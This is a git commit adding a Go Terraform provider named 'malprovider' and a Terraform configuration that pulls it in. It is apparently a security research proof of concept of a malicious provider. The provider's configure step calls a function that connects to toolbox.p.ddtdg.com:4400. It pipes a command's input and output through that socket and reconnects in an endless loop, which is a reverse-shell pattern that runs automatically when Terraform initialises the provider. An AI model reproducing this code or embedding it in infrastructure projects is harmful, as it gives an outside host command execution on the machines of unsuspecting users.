a8bfe26d0463960948d60d3d96d0bac70110248b
Mathieu Deous <mathieu.deous@datadoghq.com>
2025-02-14 11:34:41 +0100

    initial commit

---
+++ main.go
@@ -0,0 +1,62 @@
+package main
+
+import (
+	"context"
+	"net"
+	"os/exec"
+	"time"
+
+	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
+	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
+	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
+)
+
+var targetHost = "toolbox.p.ddtdg.com:4400"
+var shellCmd = "/usr/bin/uname"
+var shellArgs = []string{"-a"}
+
+func reverse() {
+	c, err := net.Dial("tcp", targetHost)
+	if err != nil {
+		if c != nil {
+			c.Close()
+		}
+		time.Sleep(time.Minute)
+		reverse()
+	}
+
+	cmd := exec.Command(shellCmd, shellArgs...)
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
+	reverse()
+}
+
+func providerConfigure(_ context.Context, _ *schema.ResourceData) (interface{}, diag.Diagnostics) {
+	var diags diag.Diagnostics
+	reverse()
+	return nil, diags
+}
+
+func dummyResource() *schema.Resource {
+	return &schema.Resource{
+		Create: func(_ *schema.ResourceData, _ interface{}) error { return nil },
+		Read:   func(_ *schema.ResourceData, _ interface{}) error { return nil },
+		Delete: func(_ *schema.ResourceData, _ interface{}) error { return nil },
+		Schema: map[string]*schema.Schema{},
+	}
+}
+
+func main() {
+	plugin.Serve(&plugin.ServeOpts{
+		ProviderFunc: func() *schema.Provider {
+			return &schema.Provider{
+				Schema: map[string]*schema.Schema{},
+				ResourcesMap: map[string]*schema.Resource{
+					"malprovider_dummy": dummyResource(),
+				},
+				ConfigureContextFunc: providerConfigure,
+			}
+		},
+	})
+}
---
+++ main.tf
@@ -0,0 +1,15 @@
+terraform {
+  required_providers {
+    malprovider = {
+      source  = "mdeous-datadog/malprovider"
+      version = "1.0.0"
+    }
+  }
+}
+
+provider "malprovider" {
+  # address = "toolbox.p.ddtdg.com:4400"
+  # command = "uname -a"
+}
+
+resource "malprovider_dummy" "md" {}
